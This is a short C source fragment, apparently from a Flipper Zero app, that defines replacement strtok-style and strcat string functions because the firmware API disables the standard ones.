/* Flipper API (api_symbols.csv) disables strtok, strtok_r AND strcat ('-'); strlen/memcpy/
 * strchr are enabled ('+'). Using any of the disabled ones makes the FAP "not runnable"
 * (APPCHK fails to resolve the symbol). These are self-contained replacements.
 * petrel_strtok has strtok_r semantics (caller passes an explicit saveptr) so interleaved or
 * nested parses on the same thread can never corrupt a shared static cursor. */
static char* petrel_strtok(char* str, const char* delim, char** saveptr) {
    char* s = str ? str : *saveptr;
    if(!s) return NULL;
    while(*s && strchr(delim, *s)) s++;            // skip leading delimiters
    if(!*s) { *saveptr = NULL; return NULL; }
    char* tok = s;
    while(*s && !strchr(delim, *s)) s++;           // run to next delimiter
    if(*s) { *s = '\0'; *saveptr = s + 1; } else { *saveptr = NULL; }
    return tok;
}
static void petrel_strcat(char* dst, const char* src) {
    size_t dl = strlen(dst), sl = strlen(src);
    memcpy(dst + dl, src, sl + 1);                 // copy src incl. its NUL
}

